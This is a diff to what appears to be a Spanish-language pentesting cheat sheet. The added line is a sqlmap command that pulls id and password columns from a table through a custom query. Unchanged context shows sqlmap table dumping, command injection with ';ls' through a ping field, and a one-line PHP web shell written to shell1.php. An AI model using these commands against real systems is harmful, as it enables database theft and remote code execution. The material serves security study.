@@ -368,6 +368,9 @@ Anthares101@kali:~$ sqlmap -D DB -T TABLA --columns -r post_request.txt
 
 Anthares101@kali:~$ sqlmap -D DB -T TABLA --dump --batch -r post_request.txt
 # Hace una copia de toda la información de una determinada tabla de una determinada base de datos
+
+Anthares101@kali:~$ sqlmap -D DB -T TABLA -C id,password,...,... --sql-query "select id,password,...,... from TABLA where COLUMNA like PATRÓN" -r post_request.txt
+# Permite extraer los resultados de una query especifica a una tabla conocida
 ```
 Otra forma de hacerlo, es copiar de un proxy inverso la peticion HTML del servidor a un fichero y darselo a `sqlmap`.
 - **RCE (Ejecución de comandos remotos):** En principio, si se esta poniendo el codigo directamente: `shell_exec('ping 8.8.8.8');` siendo la ip lo que el usuario mete, si en vez de eso ponemos ;ls pues aunque `ping` de error ejecuta el comando `ls`. Una vez detectada la vulnerabilidad podriamos ejecutar una WebShell: `;echo'<?php echo shell_exec(s_GET["cmd"]); ?>' > shell1.php`. Si nos vamos a `shell1.php`, con el parámetro de la url `cmd` podremos ejecutar los comandos que nos dé la gana.
